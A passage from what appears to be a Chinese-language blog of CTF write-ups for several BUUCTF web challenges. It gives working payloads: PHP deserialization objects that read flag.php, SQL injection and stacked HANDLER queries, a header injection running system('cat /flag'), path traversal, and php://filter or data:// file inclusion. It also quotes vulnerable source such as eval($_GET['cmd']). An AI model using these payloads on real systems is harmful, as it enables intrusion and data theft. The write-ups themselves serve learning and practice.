class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先看需要输入参数部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将序列化的结果传入给str,is_valid进行了过滤</p>
<p>unserialize()首先触发的是destruct(),接下来触发的是construct()</p>
<p>我们要读文章，因此可以忽略写文章，重点分析下面内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;		<span class="comment">//我们需要让op的值为2，进行读文件操作</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;	<span class="comment">//弱类型比较</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();	<span class="comment">//读文件</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);	<span class="comment">//输出文件</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;	<span class="comment">//让filename的值为flag.php，就可以直接读取到flag了，</span></span><br><span class="line">    <span class="comment">//也可以使用伪协议php://filter:read=convert.base64-encode/resource=flag.php读取flag文件</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;		<span class="comment">//对op的值进行强类型判断，这个地方可以用op = int 2 绕过，因为上面是弱类型进行比较的</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)<span class="comment">//强比较，这一步的强比较可以不正确，因为上一步弱比较成功过了</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;		<span class="comment">//我们不写文件，所以跟content没有什么关系</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();			<span class="comment">//调用process</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>方法一：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>变量属性是protected，它在序列化后会出现不可见字符%00*%00，可以在变量前输入\00*\00</p>
<h1 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a>[GXYCTF2019]BabySQli1</h1><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>username:admin’ or ‘1’=’1’#</p>
<p>1’union select 1,2,3#&amp;pw=3  试完之后说wrong pass，查看源码之后知道</p>
<h2 id="base32加密"><a href="#base32加密" class="headerlink" title="base32加密"></a>base32<strong>加密</strong></h2><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
<p>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</p>
<p>select * from user where username = ‘$name’</p>
<p>对$name注入没有问题，后台储存密码一般是以md5的方式进行加密</p>
<p>1.-1‘union select 1,2,3#&amp;pw=3</p>
<p>提示wrong user</p>
<p>2.-1’union select 1,’admin’,3#pw=3</p>
<p>wrong pass</p>
<p>3.1’union select 1,’admin’,’eccbc87e4b5ce2fe28308fd9f2a7baf3’#&amp;pw=3</p>
<p>id,admin,password</p>
<p>提示密码错误，而后台一般以md5的方式存密码，123456加密后输入即可</p>
<p>第三例为密码，因此要采用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;varchar(100)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag可能存在这个表里面，但是select与set、alter等众多关键词都被黑名单掉了，这里要利用HANDLER</p>
<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</p>
<p>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p>
<p>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
<p>HANDLER的详细使用方法</p>
<p>3.最终payload<br>1’;handler FlagHere open;handler FlagHere read first;Handler FlagHere close;#<br>1<br>获得flag</p>
<h1 id="网鼎杯-2018-Fakebook1"><a href="#网鼎杯-2018-Fakebook1" class="headerlink" title="[网鼎杯 2018]Fakebook1"></a>[网鼎杯 2018]Fakebook1</h1><p>先尝试了登录，没有登上去，于是注册了一个，在页面中没有找到注入点，看了wp知道，要善于观察url,id=1便是注入点，</p>
<p>id=1 order by 4#   得出列数为4</p>
<p>id=1 union/**/select 1,2,3,4#   z注入点在二的位置上</p>
<p>然后正常联合注入走</p>
<p><a href="http://dac18e7d-40ea-457c-8f23-e285a3e999e3.node4.buuoj.cn:81/view.php?no=-1">http://dac18e7d-40ea-457c-8f23-e285a3e999e3.node4.buuoj.cn:81/view.php?no=-1</a> union/**/select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:18;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’</p>
<p>第四列异常，应该是注入点</p>
<h1 id="BUUCTF-2018-Online-Tool1-escapeshellarg-和-escapeshellcmd"><a href="#BUUCTF-2018-Online-Tool1-escapeshellarg-和-escapeshellcmd" class="headerlink" title="[BUUCTF 2018]Online Tool1 escapeshellarg 和 escapeshellcmd"></a>[BUUCTF 2018]Online Tool1 escapeshellarg 和 escapeshellcmd</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="comment">//escapeshellarg</span></span><br><span class="line">    <span class="comment">//1,确保用户值传递一个参数给命令</span></span><br><span class="line">    <span class="comment">//2,用户不能指定更多的参数</span></span><br><span class="line">    <span class="comment">//3,用户不能执行不同的命令</span></span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="comment">//escapeshellcmd</span></span><br><span class="line">    <span class="comment">//1,确保用户只执行一个命令</span></span><br><span class="line">    <span class="comment">//2,用户可以指定不限数量的参数</span></span><br><span class="line">    <span class="comment">//3,用户不能执行不同的命令</span></span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\&#x27;</span><br><span class="line">&#x27;&#x27;\&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>参考文章：[<a href="https://www.cnblogs.com/Cl0ud/p/12192230.html">BUUCTF 2018]Online Tool - 春告鳥 - 博客园 (cnblogs.com)</a></p>
<h1 id="BJDCTF2020-The-mystery-of-ip1-XFF"><a href="#BJDCTF2020-The-mystery-of-ip1-XFF" class="headerlink" title="[BJDCTF2020]The mystery of ip1  XFF"></a>[BJDCTF2020]The mystery of ip1  XFF</h1><p>client-ip: {7*7}</p>
<p>clien-ip: {system(‘cat /flag’)}</p>
<h1 id="GYCTF2020-Blacklist1"><a href="#GYCTF2020-Blacklist1" class="headerlink" title="[GYCTF2020]Blacklist1"></a>[GYCTF2020]Blacklist1</h1><p>堆叠注入</p>
<p><a href="http://b87d8e8a-6b1d-48e3-9aa9-e8c44adb77ab.node3.buuoj.cn/?inject=1&#39;;handler">http://b87d8e8a-6b1d-48e3-9aa9-e8c44adb77ab.node3.buuoj.cn/?inject=1&#39;;handler</a> FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p>
<p>基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"> </span><br><span class="line">HANDLER tbl_name CLOSE</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
<p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p>
<p>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</p>
<hr>
<p>版权声明：本文为CSDN博主「无独有偶o」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_44477223/article/details/115285538">https://blog.csdn.net/weixin_44477223/article/details/115285538</a></p>
<h1 id="GWCTF-2019-我有一个数据库1"><a href="#GWCTF-2019-我有一个数据库1" class="headerlink" title="[GWCTF 2019]我有一个数据库1"></a>[GWCTF 2019]我有一个数据库1</h1><p>先用dirsearch扫描，发现phpadmin,不用登陆直接进入了，然后查看版本，网上搜这个版本的漏洞，另外查看index.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?target=db_sql.php?/../../../../../../../../flag</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF2020-ZJCTF，不过如此1"><a href="#BJDCTF2020-ZJCTF，不过如此1" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此1"></a>[BJDCTF2020]ZJCTF，不过如此1</h1><h2 id="preg-replace-‘-‘-re-‘-ei’-‘strtolower-“-1”-’-str"><a href="#preg-replace-‘-‘-re-‘-ei’-‘strtolower-“-1”-’-str" class="headerlink" title="preg_replace( ‘/(‘ . $re . ‘)/ei’, ‘strtolower(“\1”)’,$str     )"></a>preg_replace( ‘/(‘ . $re . ‘)/ei’, ‘strtolower(“\1”)’,$str     )</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同时文件写入和文件读取</p>
<p>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/convert.base64-encode/resource=next.php</p>
<p>然后base64解码，得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>preg_replace( ‘/(‘ . $re . ‘)/ei’, ‘strtolower(“\1”)’,$str)</p>
<p>我们先看第二个参数中的\1 ，\1实际上就是 \1，而 \1 在正则表达式中有自己的含义</p>
